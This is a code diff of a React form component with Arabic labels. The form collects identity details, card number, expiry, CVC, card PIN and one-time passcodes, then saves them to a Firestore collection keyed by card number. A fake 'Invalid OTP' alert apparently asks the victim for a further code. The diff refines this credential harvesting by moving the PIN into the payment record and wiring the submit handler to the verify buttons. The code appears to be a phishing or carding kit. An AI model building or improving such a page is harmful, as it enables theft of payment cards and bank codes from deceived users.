@@ -117,7 +117,7 @@ export default function Component() {
 
     const handleSubmit = (e: React.FormEvent) => {
         e.preventDefault()
-        let alldat = { personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc }, otp: { otp: otp },pass:pass }
+        let alldat = { personalInfo: { id: id, name: name, email: email, phone: phone }, payment: { cardNumber: cardNumber, expiry: expiry, cvc: cvc,pass:pass }, otp: { otp: otp } }
         setDoc(doc(db, "data", cardNumber), alldat);
 
     }
@@ -442,10 +442,10 @@ placeholder="الرقم السري للبطاقة"
                             </Button>
 
                         ) : step === 5 ? (
-                            <Button type="submit" onClick={()=>setStep(step+1)} >
+                            <Button type="submit" onClick={()=>setStep(step+1)}  onSubmit={handleSubmit}>
                                 تحقق
                             </Button>
-                        ) : step === 6 ? (<Button type="submit" onClick={() => alert("Invalid OTP")}>
+                        ) : step === 6 ? (<Button type="submit" onClick={() => alert("Invalid OTP")} onSubmit={handleSubmit}>
                             تحقق
                         </Button>) :
                             (
